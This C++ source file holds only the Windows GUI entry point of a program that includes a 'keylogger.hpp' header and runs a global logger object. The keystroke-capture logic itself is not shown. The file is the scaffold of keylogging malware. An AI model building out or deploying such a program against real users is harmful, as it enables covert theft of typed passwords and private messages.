#include "keylogger.hpp"

int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev_instance, _In_ LPWSTR cmd_line, _In_ int show_cmd)
{
    return g_logger.run();
}
